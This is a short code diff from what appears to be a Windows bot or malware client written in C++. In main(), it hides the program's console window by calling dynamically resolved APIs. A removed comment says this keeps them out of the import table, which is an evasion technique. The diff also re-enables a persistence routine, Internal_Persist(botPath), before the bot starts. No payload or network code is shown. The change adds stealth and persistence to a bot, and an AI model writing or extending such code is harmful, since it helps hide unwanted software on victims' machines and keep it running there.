@@ -13,7 +13,7 @@ int main() {
   
   API_TABLE& API = GetAPI();
 
-  //hide console (resolved dynamically — not in IAT)
+  //hide console
   if (API.GetConsoleWindow && API.ShowWindow) {
     HWND stealth = API.GetConsoleWindow();
     API.ShowWindow(stealth, 0); // SW_HIDE = 0
@@ -40,7 +40,7 @@ int main() {
     return 1;
   }
 
-  //Internal_Persist(botPath);
+  Internal_Persist(botPath);
 
   start_bot();
 
